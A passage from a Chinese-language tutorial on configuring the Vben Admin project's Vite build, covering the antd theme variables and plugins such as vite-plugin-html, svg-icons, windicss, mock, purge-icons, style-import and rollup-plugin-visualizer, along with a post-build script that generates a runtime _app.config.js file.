\u0026#39;text-color\u0026#39;: \u0026#39;rgba(0, 0, 0, 0.85)\u0026#39;, // Main text color \u0026#39;text-color-secondary\u0026#39;: \u0026#39;rgba(0, 0, 0, 0.45)\u0026#39;, // Subtext color \u0026#39;font-size-base\u0026#39;: \u0026#39;14px\u0026#39;, // Main font size \u0026#39;box-shadow-base\u0026#39;: \u0026#39;0 2px 8px rgba(0, 0, 0, 0.15)\u0026#39;, // Floating shadow \u0026#39;border-color-base\u0026#39;: \u0026#39;#d9d9d9\u0026#39;, // Border color, \u0026#39;border-radius-base\u0026#39;: \u0026#39;2px\u0026#39;, // Component/float fillet \u0026#39;link-color\u0026#39;: primary, // Link color }; } 這個方法就是生成antd主題變量對象的。將該對象的結果放到Vite的less配置中：\nvite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // ... import { generateModifyVars } from \u0026#39;./build/config/themeConfig\u0026#39;; // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... css: { preprocessorOptions: { less: { modifyVars: { // ... ...generateModifyVars(), }, // ... }, }, }, // ... }; }; Vite配置-plugin 說明 Vite配置-plugin說明\n官網原文：\n類型： 1 (Plugin | Plugin[])[] 將要用到的插件數組。查看 插件 API 獲取 Vite 插件的更多細節。\n配置插件 它接收一個插件對象，或者一個插件數組。由於我們需要配置很多插件，而每一個插件的配置也不一樣，所以我們把插件數組封裝到一個方法中去。統一配置VbenAdmin的插件。\n創建生成插件數組方法 build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 import type { Plugin } from \u0026#39;vite\u0026#39;; import type { ViteEnv } from \u0026#39;../../utils\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean) { const { VITE_USE_IMAGEMIN, VITE_USE_MOCK, VITE_LEGACY, VITE_BUILD_COMPRESS } = viteEnv; const vitePlugins: (Plugin | Plugin[])[] = []; return vitePlugins; } 後續配置vitePlugins這個數組。\n配置Vite插件 vite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 // ... import { createVitePlugins } from \u0026#39;./build/vite/plugin\u0026#39;; // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... // 項目使用的vite插件。數量大，單獨提取管理 plugins: createVitePlugins(viteEnv, isBuild), // ... }; }; Vite插件-@vitejs-plugin-vue 說明 @vitejs/plugin-vue的npm首頁\n要編寫Vue程序，這個不用解釋了吧，在使用Vite創建應用程序的時候，這個依賴就已經默認加上了。\n引入組件 vue插件不用配置，可以直接放進去。\nbuild/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 // ... import vue from \u0026#39;@vitejs/plugin-vue\u0026#39;; // ... export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean) { // ... const vitePlugins: (Plugin | Plugin[])[] = [vue()]; // ... return vitePlugins; } Vite插件-@vitejs-plugin-vue-jsx 說明 為什麼使用JSX？\n其實JSX的效果和我們在vue的template中寫的代碼效果是一樣的。最終都會被渲染成createElement。 區別是template的標籤是不可變的，我們要實現動態標籤，只能使用v-if。而JSX的最大特點就是靈活，我們可以隨意組裝HTML代碼。 假如我們要實現一個組件渲染\u0026lt;hn\u0026gt;\u0026lt;/hn\u0026gt;標籤，n是我們傳入的參數。如果用template，那麼我們要寫6個v-if。但是如果使用JSX，我們就可以直接將n放到標籤中去。\n參考連結 @vitejs/plugin-vue-jsx的npm首頁 Vue-JSX Vue- JSX 中的用法 Vue-setup中使用JSX Vue-模板語法 安裝 1 yarn add @vitejs/plugin-vue-jsx --dev vue-jsx插件不用配置，可以直接放進去。\nbuild/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 // ... import vueJsx from \u0026#39;@vitejs/plugin-vue-jsx\u0026#39;; // ... export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean) { // ... const vitePlugins: (Plugin | Plugin[])[] = [vue(),vueJsx()]; // ... return vitePlugins; } Vite插件-@vitejs-plugin-legacy 說明 原文描述：\n注：此插件需要vite@^2.0.0-beta.12。\nVite默認的瀏覽器支持基線是原生ESM。本插件為不支持原生ESM的傳統瀏覽器提供支持。\n默認情況下，該插件將為最終bundle中的每個chunk生成一個相應的legacy chunk，用@babel/reset-env進行轉換，並以SystemJS模塊的形式發布（仍然支持代碼分割！）。\n生成一個包含SystemJS運行時的polyfill chunk，以及由指定的瀏覽器目標和捆綁包中的實際使用情況決定的任何必要的polyfills。\n在生成的HTML中註入\u0026lt;script nomodule\u0026gt;標籤，以便在沒有本地ESM支持的瀏覽器中有條件地加載polyfills和legacy bundle。\n注入 import.meta.env.LEGACY env 變量，該變量僅在 legacy 生產構建中為真，而在所有其他情況下為假。(需要vite@^2.0.0-beta.69)。\n所以這個是一個瀏覽器兼容的插件。我們直接安裝使用，個人感覺學習的話也用不上。\n參考連結 @vitejs/plugin-legacy的npm首頁 安裝 1 yarn add @vitejs/plugin-legacy --dev VbenAdmin配置build/vite/plugin/index.ts： build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 // ... import legacy from \u0026#39;@vitejs/plugin-legacy\u0026#39;; // ... export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean) { // ... // @vitejs/plugin-legacy VITE_LEGACY \u0026amp;\u0026amp; isBuild \u0026amp;\u0026amp; vitePlugins.push(legacy()); // ... return vitePlugins; } Vite插件-vite-plugin-html 說明 原文描述：\n一個為index.html提供minify和基於EJS模板功能的Vite插件。\nminify：壓縮index.html代碼。 EJS：給index.html提供訪問變量的能力。 參考連結 vite-plugin-html的npm首頁 安裝 1 yarn add vite-plugin-html --dev 創建配置文件 build/vite/plugin/html.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 /** * Plugin to minimize and use ejs template syntax in index.html. * https://github.com/anncwb/vite-plugin-html */ import type { Plugin } from \u0026#39;vite\u0026#39;; import type { ViteEnv } from \u0026#39;../../utils\u0026#39;; import html from \u0026#39;vite-plugin-html\u0026#39;; import pkg from \u0026#39;../../../package.json\u0026#39;; import { GLOB_CONFIG_FILE_NAME } from \u0026#39;../../constant\u0026#39;; export function configHtmlPlugin(env: ViteEnv, isBuild: boolean) { const { VITE_GLOB_APP_TITLE, VITE_PUBLIC_PATH } = env; // ↓ 這里後續章動態配置講解 // const path = VITE_PUBLIC_PATH.endsWith(\u0026#39;/\u0026#39;) ? VITE_PUBLIC_PATH : `${VITE_PUBLIC_PATH}/`; // const getAppConfigSrc = () =\u0026gt; { // return `${path || \u0026#39;/\u0026#39;}${GLOB_CONFIG_FILE_NAME}?v=${pkg.version}-${new Date().getTime()}`; // }; const htmlPlugin: Plugin[] = html({ minify: isBuild, inject: { // Inject data into ejs template injectData: { title: VITE_GLOB_APP_TITLE, }, // ↓ 這里後續章動態配置講解 // tags: isBuild // ? [ // { // tag: \u0026#39;script\u0026#39;, // attrs: { // src: getAppConfigSrc(), // }, // }, // ] // : [], }, }); return htmlPlugin; } 配置Vite插件 build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 // ... import { configHtmlPlugin } from \u0026#39;./html\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean) { // ... // vite-plugin-html vitePlugins.push(configHtmlPlugin(viteEnv, isBuild)); // ... } 補充 做完本章操作之後，我突然發現項目不能編譯了。\n總是報package.json找不到。我看了一下代碼，主要就是build\\vite\\plugin\\html.ts中的導入無法找到。\n我反復對比了一下VbenAdmin的源碼。也沒有發現有什麼不同的地方。\n然後我又試了一下，當執行vite命令的時候，build文件夾下始終不能訪問package.json。但是src和vite.config.ts中都可以導入訪問。\n那麼這裡有兩種講解方案：\n去掉導入 這裡的導入只是我們在使用_app.config.js的時候加上一個版本信息。可以讓我們知道這個項目是多久打包的，打包的時候版本是多少。所以去掉也無妨，_app.config.js還是一樣可以訪問的。\n從vite.config.ts中傳參下去 我使用了這個方案，因為萬一build文件夾其他地方要用package.json呢。不過用的地方應該也很少吧。\n修改vite.config.ts：\nvite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 // ... import pkg from \u0026#39;./package.json\u0026#39;; // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... // The vite plugin used by the project. The quantity is large, so it is separately extracted and managed plugins: createVitePlugins(viteEnv, isBuild, pkg), // ... }; }; 修改build/vite/plugin/index.ts：\nbuild/vite/plugin/index.ts 1 2 3 4 5 6 7 // ... export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean, pkg: any) { // ... vitePlugins.push(configHtmlPlugin(viteEnv, isBuild, pkg)); return vitePlugins; } 修改build/vite/plugin/html.ts：\nbuild/vite/plugin/html.ts 1 2 3 4 5 6 7 8 9 10 11 // ... import html from \u0026#39;vite-plugin-html\u0026#39;; export function configHtmlPlugin(env: ViteEnv, isBuild: boolean, pkg: any) { // ... const getAppConfigSrc = () =\u0026gt; { return `${path || \u0026#39;/\u0026#39;}${GLOB_CONFIG_FILE_NAME}?v=${pkg.version}-${new Date().getTime()}`; }; // ... return htmlPlugin; } 完善build的utils.ts 說明 完善build\\utils.ts文件。\n第一部分 除了這個process，應該也沒有要解釋的吧。\nNode中文文檔-process\nbuild/utils.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 export function isDevFn(mode: string): boolean { return mode === \u0026#39;development\u0026#39;; } export function isProdFn(mode: string): boolean { return mode === \u0026#39;production\u0026#39;; } /** * Whether to generate package preview */ export function isReportMode(): boolean { return process.env.REPORT === \u0026#39;true\u0026#39;; } 安裝dotenv dotenv依賴的作用：從.evn文件流Buffer中讀取屬性輸出一個對象。\n那麼和我們之前的加載環境變量的區別：\nVite的loadEnv()：這個方法Vite的官網上貌似沒有開放，而且獲取的文件是指定的，獲取的對象需要我們自己格式化一下。 Vben的wrapperEnv()：這是一個格式化環境變量的方法。 dotenv：是一個依賴，其功能不僅僅是獲取環境變量，當然我們目前只用它來獲取指定的.env文件。 dotenv的npm首頁\n1 yarn add dotenv --dev 第二部分 Node中文文檔-fs Node中文文檔-path dotenv的npm首頁 build/utils.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 import fs from \u0026#39;fs\u0026#39;; import path from \u0026#39;path\u0026#39;; import dotenv from \u0026#39;dotenv\u0026#39;; /** * Get the environment variables starting with the specified prefix * @param match prefix * @param confFiles ext */ export function getEnvConfig(match = \u0026#39;VITE_GLOB_\u0026#39;, confFiles = [\u0026#39;.env\u0026#39;, \u0026#39;.env.production\u0026#39;]) { let envConfig = {}; // ↓ 循環文件名 confFiles.forEach((item) =\u0026gt; { try { // ↓ 同步讀取根目錄下指定的文件，將讀取的六傳入dotenv輸出對象 const env = dotenv.parse(fs.readFileSync(path.resolve(process.cwd(), item))); // ↓ 將新獲取的對象追加到結果中，相同的覆蓋 envConfig = { ...envConfig, ...env }; } catch (error) {} }); // ↓ 檢查輸出結果 Object.keys(envConfig).forEach((key) =\u0026gt; { // ↓ 如果不是以傳入的match變量開的就直接刪除 const reg = new RegExp(`^(${match})`); if (!reg.test(key)) { Reflect.deleteProperty(envConfig, key); } }); return envConfig; } /** * Get user root directory * @param dir file path */ export function getRootPath(...dir: string[]) { return path.resolve(process.cwd(), ...dir); } Vben的獲取配置文件名的方法 build/getConfigFileName.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 /** * Get the configuration file variable name * @param env */ export const getConfigFileName = (env: Record\u0026lt;string, any\u0026gt;) =\u0026gt; { return ( `__PRODUCTION__${env.VITE_GLOB_APP_SHORT_NAME || \u0026#39;__APP\u0026#39;}__CONF__` // ↓ 換成大寫 .toUpperCase() // ↓ 將空白換成空字符串 .replace(/\\s/g, \u0026#39;\u0026#39;) ); }; Vben動態配置環境變量 說明 前面章節中，我們在build\\vite\\plugin中註釋一段index.html中插入的script段。這一段script是用於Vben的動態配置環境變量的。\n當你打包完項目之後，你的項目的環境變量就不可以變了。此時如果你想修改一下項目的基礎API路徑，那麼你需要修改.env文件，然後再次打包一遍。這麼做很麻煩。所以VbenAdmin將環境變量抽離出來。\n當你的項目打包完成之後，如果你還想修改環境變量，那麼可以直接修改dist包下的_app.config.js文件。\n下面看實現。\n安裝fs-extra 1 yarn add fs-extra @types/fs-extra --dev fs-extra的npm首頁：fs-extra添加本機fs模塊中未包含的文件系統方法。\n編寫生成配置文件的程序 Node-Api-fs\nbuild/script/buildConf.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 /** * Generate additional configuration files when used for packaging. The file can be configured with some global variables, so that it can be changed directly externally without repackaging */ import { GLOB_CONFIG_FILE_NAME, OUTPUT_DIR } from \u0026#39;../constant\u0026#39;; import fs, { writeFileSync } from \u0026#39;fs-extra\u0026#39;; import chalk from \u0026#39;chalk\u0026#39;; import { getRootPath, getEnvConfig } from \u0026#39;../utils\u0026#39;; import { getConfigFileName } from \u0026#39;../getConfigFileName\u0026#39;; import pkg from \u0026#39;../../package.json\u0026#39;; function createConfig( { // ↓ windows對像下的存儲配置的屬性名 configName, // ↓ 存儲配置的對象 config, // ↓ JS文件名 configFileName = GLOB_CONFIG_FILE_NAME, }: { configName: string; config: any; configFileName?: string } = { configName: \u0026#39;\u0026#39;, config: {} } ) { try { // ↓ 變量字符串 const windowConf = `window.${configName}`; // Ensure that the variable will not be modified // ↓ 將配置的對像以JSON字符串格式拼接到變量字符串後面，最後用正則將空格去掉 const configStr = `${windowConf}=${JSON.stringify(config)}; Object.freeze(${windowConf}); Object.defineProperty(window, \u0026#34;${configName}\u0026#34;, { configurable: false, writable: false, }); `.replace(/\\s/g, \u0026#39;\u0026#39;); // ↓ 創建dist文件夾 fs.mkdirp(getRootPath(OUTPUT_DIR)); // ↓ 將字符串寫入到dist文件下的指定JS文件名的文件中 writeFileSync(getRootPath(`${OUTPUT_DIR}/${configFileName}`), configStr); console.log(chalk.cyan(`✨ [${pkg.name}]`) + ` - configuration file is build successfully:`); console.log(chalk.gray(OUTPUT_DIR + \u0026#39;/\u0026#39; + chalk.green(configFileName)) + \u0026#39;\\n\u0026#39;); } catch (error) { console.log(chalk.red(\u0026#39;configuration file configuration file failed to package:\\n\u0026#39; + error)); } } export function runBuildConfig() { // ↓ 獲取我們可以配置的環境變量對象 const config = getEnvConfig(); // ↓ 獲取配置文件的JS名 const configFileName = getConfigFileName(config); // ↓ 創建文件 createConfig({ config, configName: configFileName }); } 安裝yargs yargs的npm首頁：讀取你執行的命令行命令中的參數選項。\n1 2 yarn add yargs --dev yarn add @types/yargs --dev 編寫腳本觸發文件 chalk的npm首頁：一個彩色console.log的工具，這個依賴被其他依賴作為生產依賴安裝在本項目中了，所以也不去猜是哪個依賴的了，直接使用。\nbuild/script/postBuild.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 // #!/usr/bin/env node import { argv } from \u0026#39;yargs\u0026#39;; import { runBuildConfig } from \u0026#39;./buildConf\u0026#39;; import chalk from \u0026#39;chalk\u0026#39;; import pkg from \u0026#39;../../package.json\u0026#39;; // ↓ 定義創建配置文件的方法，最條件判斷 export const runBuild = async () =\u0026gt; { try { // 獲取命令中不以\u0026#39;-\u0026#39;開頭的參數 const argvList = argv._; // Generate configuration file // ↓ 如果參數中包含\u0026#39;no-conf\u0026#39;，那麼就不創建配置文件 if (!argvList.includes(\u0026#39;no-conf\u0026#39;)) { // ↓ 同步創建配置文件 await runBuildConfig(); } console.log(`✨ ${chalk.cyan(`[${pkg.name}]`)}` + \u0026#39; - build successfully!\u0026#39;); } catch (error) { console.log(chalk.red(\u0026#39;vite build error:\\n\u0026#39; + error)); process.exit(1); } }; // ↓ 執行方法 runBuild(); 安裝esno esno的npm首頁：命令行執行一個TS文件\n1 yarn add esno --dev 編寫腳本 在編譯的時候調用TS文件：\npackage.json 1 2 3 4 5 6 7 { \u0026#34;scripts\u0026#34;: { // ... \u0026#34;build\u0026#34;: \u0026#34;vite build \u0026amp;\u0026amp; esno ./build/script/postBuild.ts\u0026#34;, \u0026#34;build-noconf\u0026#34;: \u0026#34;vite build \u0026amp;\u0026amp; esno ./build/script/postBuild.ts no-conf\u0026#34; } } index.html注入配置文件 build/vite/plugin/html.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 /** * Plugin to minimize and use ejs template syntax in index.html. * https://github.com/anncwb/vite-plugin-html */ import type { Plugin } from \u0026#39;vite\u0026#39;; import type { ViteEnv } from \u0026#39;../../utils\u0026#39;; import html from \u0026#39;vite-plugin-html\u0026#39;; import pkg from \u0026#39;../../../package.json\u0026#39;; import { GLOB_CONFIG_FILE_NAME } from \u0026#39;../../constant\u0026#39;; export function configHtmlPlugin(env: ViteEnv, isBuild: boolean) { const { VITE_GLOB_APP_TITLE, VITE_PUBLIC_PATH } = env; const path = VITE_PUBLIC_PATH.endsWith(\u0026#39;/\u0026#39;) ? VITE_PUBLIC_PATH : `${VITE_PUBLIC_PATH}/`; const getAppConfigSrc = () =\u0026gt; { return `${path || \u0026#39;/\u0026#39;}${GLOB_CONFIG_FILE_NAME}?v=${pkg.version}-${new Date().getTime()}`; }; const htmlPlugin: Plugin[] = html({ minify: isBuild, inject: { // Inject data into ejs template injectData: { title: VITE_GLOB_APP_TITLE, }, // Embed the generated app.config.js file // ↓ 在此處插入 tags: isBuild ? [ { tag: \u0026#39;script\u0026#39;, attrs: { src: getAppConfigSrc(), }, }, ] : [], }, }); return htmlPlugin; } 注意 之後在業務邏輯中獲取環境變量，就需要從這個JS文件中獲取了。從而達到在生產環境改配置的需求。\n參考：src\\utils\\env.ts，但是這個後面再說。\nVite插件-vite-plugin-svg-icon 說明 當你使用該插件的時候，指定好存放svg的文件夾。再按照指定的方式去訪問svg圖片。就可以再不產生http請求的情況下渲染出svg圖片。\n使用該插件時，插件會自動將所有svg圖片加載到HTML中。並且每一個svg將會被過濾去無用的信息數據。讓svg達到最小的值。之後使用svg圖片就只需要操作DOM即可，而不需要發送http請求。\n安裝 1 yarn add vite-plugin-svg-icons --dev 創建配置 build/vite/plugin/svgSprite.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 /** * Vite Plugin for fast creating SVG sprites. * https://github.com/anncwb/vite-plugin-svg-icons */ import SvgIconsPlugin from \u0026#39;vite-plugin-svg-icons\u0026#39;; import path from \u0026#39;path\u0026#39;; export function configSvgIconsPlugin(isBuild: boolean) { const svgIconsPlugin = SvgIconsPlugin({ // ↓ 本地svg圖片地址 iconDirs: [path.resolve(process.cwd(), \u0026#39;src/assets/icons\u0026#39;)], svgoOptions: isBuild, // 圖標ID的樣式 symbolId: \u0026#39;icon-[dir]-[name]\u0026#39;, }); return svgIconsPlugin; } 選項svgOptions的boolean類型不太清楚是乾什麼的。但是對像類型是控制svg過濾無用信息的選項。使用true是使用默認選項，false時不知道做什麼的但是也沒什麼影響。\n用於配置 build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 // ... import { configSvgIconsPlugin } from \u0026#39;./svgSprite\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean) { // ... // vite-plugin-svg-icons vitePlugins.push(configSvgIconsPlugin(isBuild)); // ... return vitePlugins; } main導入 src/main.ts 1 2 3 // ... import \u0026#39;vite-plugin-svg-icons/register\u0026#39;; // ... 創建Svg組件 這裡有一個樣式，是全局上下文注入的。這個後面再講，先寫成string。\nsrc/components/Icon/src/SvgIcon.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 \u0026lt;template\u0026gt; \u0026lt;svg class=\u0026#34;vben-svg-icon\u0026#34; :class=\u0026#34;[$attrs.class]\u0026#34; :style=\u0026#34;getStyle\u0026#34; aria-hidden=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;use :xlink:href=\u0026#34;symbolId\u0026#34; /\u0026gt; \u0026lt;/svg\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; import type { CSSProperties } from \u0026#39;vue\u0026#39;; import { defineComponent, computed } from \u0026#39;vue\u0026#39;; // import { useDesign } from \u0026#39;/@/hooks/web/useDesign\u0026#39;; export default defineComponent({ name: \u0026#39;SvgIcon\u0026#39;, props: { prefix: { type: String, default: \u0026#39;icon\u0026#39;, }, name: { type: String, required: true, }, size: { type: [Number, String], default: 16, }, }, setup(props) { // const { prefixCls } = useDesign(\u0026#39;svg-icon\u0026#39;); const symbolId = computed(() =\u0026gt; `#${props.prefix}-${props.name}`); const getStyle = computed( (): CSSProperties =\u0026gt; { const { size } = props; let s = `${size}`; s = `${s.replace(\u0026#39;px\u0026#39;, \u0026#39;\u0026#39;)}px`; return { width: s, height: s, }; } ); // prefixCls, return { symbolId, getStyle }; }, }); \u0026lt;/script\u0026gt; \u0026lt;style lang=\u0026#34;less\u0026#34; scoped\u0026gt; // @prefix-cls: ~\u0026#39;@{namespace}-svg-icon\u0026#39;; // .@{prefix-cls} { .vben-svg-icon { overflow: hidden; vertical-align: -0.15em; fill: currentColor; } \u0026lt;/style\u0026gt; Vite插件-vite-plugin-windicss 說明 在Vite上單獨使用Tailwind時，渲染速度很慢。\nvite-plugin-windicss比Tailwind快20到100倍。\nvite-plugin-windicss的npm首頁 windicss官網 安裝 1 yarn add vite-plugin-windicss --dev 創建Windicss配置文件 windicss的配置 tailwind的配置 tailwind.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 import lineClamp from \u0026#39;windicss/plugin/line-clamp\u0026#39;; import colors from \u0026#39;windicss/colors\u0026#39;; import { defineConfig } from \u0026#39;vite-plugin-windicss\u0026#39;; import { primaryColor } from \u0026#39;./build/config/themeConfig\u0026#39;; export default defineConfig({ darkMode: \u0026#39;class\u0026#39;, plugins: [lineClamp, createEnterPlugin()], theme: { extend: { colors: { ...colors, primary: primaryColor, }, screens: { sm: \u0026#39;576px\u0026#39;, md: \u0026#39;768px\u0026#39;, lg: \u0026#39;992px\u0026#39;, xl: \u0026#39;1200px\u0026#39;, \u0026#39;2xl\u0026#39;: \u0026#39;1600px\u0026#39;, }, }, }, }); /** * Used for animation when the element is displayed * @param maxOutput The larger the maxOutput output, the larger the generated css volume */ function createEnterPlugin(maxOutput = 10) { const createCss = (index: number, d = \u0026#39;x\u0026#39;) =\u0026gt; { const upd = d.toUpperCase(); return { [`*\u0026gt; .enter-${d}:nth-child(${index})`]: { transform: `translate${upd}(50px)`, }, [`*\u0026gt; .-enter-${d}:nth-child(${index})`]: { transform: `translate${upd}(-50px)`, }, [`* \u0026gt; .enter-${d}:nth-child(${index}),* \u0026gt; .-enter-${d}:nth-child(${index})`]: { \u0026#39;z-index\u0026#39;: `${10 - index}`, opacity: \u0026#39;0\u0026#39;, animation: `enter-${d}-animation 0.4s ease-in-out 0.3s`, \u0026#39;animation-fill-mode\u0026#39;: \u0026#39;forwards\u0026#39;, \u0026#39;animation-delay\u0026#39;: `${(index * 1) / 10}s`, }, }; }; const handler = ({ addBase }) =\u0026gt; { const addRawCss = {}; for (let index = 1; index \u0026lt; maxOutput; index++) { Object.assign(addRawCss, { ...createCss(index, \u0026#39;x\u0026#39;), ...createCss(index, \u0026#39;y\u0026#39;), }); } addBase({ ...addRawCss, [`@keyframes enter-x-animation`]: { to: { opacity: \u0026#39;1\u0026#39;, transform: \u0026#39;translateX(0)\u0026#39;, }, }, [`@keyframes enter-y-animation`]: { to: { opacity: \u0026#39;1\u0026#39;, transform: \u0026#39;translateY(0)\u0026#39;, }, }, }); }; return { handler }; } 創建配置文件 build/vite/plugin/windicss.ts 1 2 3 4 5 6 7 8 9 10 11 12 import type { Plugin } from \u0026#39;vite\u0026#39;; import windiCSS from \u0026#39;vite-plugin-windicss\u0026#39;; export function configWindiCssPlugin(): Plugin[] { return windiCSS({ safelist: \u0026#39;no-select\u0026#39;, preflight: { enableAll: true, }, }); } 應用配置 build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 // ... import { configWindiCssPlugin } from \u0026#39;./windicss\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean) { // ... // vite-plugin-windicss vitePlugins.push(configWindiCssPlugin()); return vitePlugins; } 導入樣式 src/main.ts 1 2 3 // ... import \u0026#39;@virtual/windi.css\u0026#39;; // ... Vite插件-vite-plugin-mock 說明 vite-plugin-mock的npm首頁\n根據我自己的實驗：\nlocalEnabled控制mock開發環境是否啟動。\n如果生產環境想要使用mock，只有prodEnabled為true，injectCode注入指定代碼時才會生效。\n安裝 1 yarn add mockjs vite-plugin-mock --dev 編寫Mock用例 這裡直接將根目錄下的mock目錄拷貝出來就行。\nmock\\_util.ts：裡面封裝的是數據請求結構類型。 mock\\_createProductionServer.ts：用於配置生產環境動態Mock的js文件，文檔中有說。 其他的：都是Mock用例，每一個js、ts，都要默認導出一個MockMethod類型的數組。每一項MockMethod就是攔截的一個方法。MockMethod的response對應方法的return將會被Mock實例處理。也就是說，你可以在return的對像中使用Mock規則。 不過_createProductionServer.ts中使用了Glob 導入。\n配置Mock build/vite/plugin/mock.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 /** * Mock plugin for development and production. * https://github.com/anncwb/vite-plugin-mock */ import { viteMockServe } from \u0026#39;vite-plugin-mock\u0026#39;; export function configMockPlugin(isBuild: boolean) { return viteMockServe({ // ↓ 忽略以_開頭的文件 ignore: /^\\_/, // ↓ 解析根目錄下的mock文件夾 mockPath: \u0026#39;mock\u0026#39;, localEnabled: !isBuild, prodEnabled: isBuild, injectCode: ` import { setupProdMockServer } from \u0026#39;../mock/_createProductionServer\u0026#39;; setupProdMockServer(); `, }); } 配置進Vite build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 // ... import { configMockPlugin } from \u0026#39;./mock\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean, pkg: any) { // ... // vite-plugin-mock VITE_USE_MOCK \u0026amp;\u0026amp; vitePlugins.push(configMockPlugin(isBuild)); return vitePlugins; } Vite插件-vite-plugin-purge-icons 說明 本章的插件是可以讓我們很方便高效的使用Iconify中所有的圖標。\n這裡要講的是Iconify各個版本插件的區別：\nVue3版Iconify插件：使用時需要安裝指定庫的圖標，然後靜態引用。每一次引用都會產生一次http請求。 PurgeIcons：將我們所使用的Iconify圖標都已html的dom節點形式保存在html中，這樣我們就可以不發送http請求就可以使用圖標了。 vite-plugin-purge-icons：就是Vite版的PurgeIcons。 vite-plugin-purge-icons的npm首頁\n安裝 1 2 yarn add @iconify/iconify yarn add vite-plugin-purge-icons @iconify/json --dev 配置Vite build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 11 // ... import PurgeIcons from \u0026#39;vite-plugin-purge-icons\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean) { // ... // vite-plugin-purge-icons vitePlugins.push(PurgeIcons()); // ... return vitePlugins; } 注意 Icon組件後面再封裝，由於我們main.ts中沒有引入vite-plugin-purge-icons。所以，這裡還不能使用。後面會動態生成圖標。\nVite插件-vite-plugin-style-import 說明 vite-plugin-style-import的npm首頁\n該插件可按需導入組件庫樣式，由於 vite 本身已按需導入了組件庫，因此僅樣式不是按需導入的，因此只需按需導入樣式即可。\n安裝 1 yarn add vite-plugin-style-import --dev 配置插件 build/vite/plugin/styleImport.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 /** * Introduces component library styles on demand. * https://github.com/anncwb/vite-plugin-style-import */ import styleImport from \u0026#39;vite-plugin-style-import\u0026#39;; export function configStyleImportPlugin() { // if (!isBuild) return []; const pwaPlugin = styleImport({ libs: [ { libraryName: \u0026#39;ant-design-vue\u0026#39;, esModule: true, resolveStyle: (name) =\u0026gt; { return `ant-design-vue/es/${name}/style/index`; }, }, ], }); return pwaPlugin; } 配置Vite build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 // ... import { configStyleImportPlugin } from \u0026#39;./styleImport\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean, pkg: any) { // ... // vite-plugin-style-import vitePlugins.push(configStyleImportPlugin()); return vitePlugins; } Vite插件-rollup-plugin-visualizer 說明 rollup-plugin-visualizer的npm首頁：依賴分析插件。 cross-env的npm首頁：命令行配置環境變量。 安裝 1 yarn add rollup-plugin-visualizer @types/rollup-plugin-visualizer --dev 配置插件 build/vite/plugin/visualizer.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /** * Package file volume analysis */ import visualizer from \u0026#39;rollup-plugin-visualizer\u0026#39;; import { isReportMode } from \u0026#39;../../utils\u0026#39;; import type { Plugin } from \u0026#39;vite\u0026#39;; export function configVisualizerConfig() { if (isReportMode()) { return visualizer({ filename: \u0026#39;./node_modules/.cache/visualizer/stats.html\u0026#39;, open: true, // @ts-ignore gzipSize: true, // @ts-ignore brotliSize: true, }) as Plugin; } return []; } 配置Vite 